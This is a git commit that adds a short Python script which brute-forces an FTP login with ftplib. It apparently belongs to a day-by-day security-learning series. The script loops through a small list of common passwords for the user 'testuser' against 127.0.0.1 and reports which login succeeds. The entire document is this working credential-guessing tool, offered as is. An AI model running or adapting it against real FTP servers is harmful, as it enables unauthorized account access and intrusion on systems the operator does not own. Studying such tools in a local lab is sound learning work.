06d3fcb8b4104c506ede79a32260e1ac666ac3fa
NIKHIL KUMAR <123356597+N1KHIL-KUMAR@users.noreply.github.com>
2025-07-06 01:52:09 +0530

    Update ftp_brute_force.py

--- day-21-FTP-Brute-Force/ftp_brute_force.py
+++ day-21-FTP-Brute-Force/ftp_brute_force.py
@@ -1,1 +1,27 @@
+#!/usr/bin/python3
+
+import ftplib
+
+def ftp_brute_force(host, username, password_list):
+    for password in password_list:
+        try:
+            ftp = ftplib.FTP(host)
+            ftp.login(user=username, passwd=password)
+            print(f"[+] Success: Username: {username} | Password: {password}")
+            ftp.quit()
+            return
+        except ftplib.error_perm:
+            print(f"[-] Failed: {password}")
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            break
+    print("[!] Brute force complete.")
+
+host = "127.0.0.1"  
+username = "testuser"
+
+
+passwords = ["1234", "admin", "password", "letmein", "ftp123"]
+
+ftp_brute_force(host, username, passwords)
 
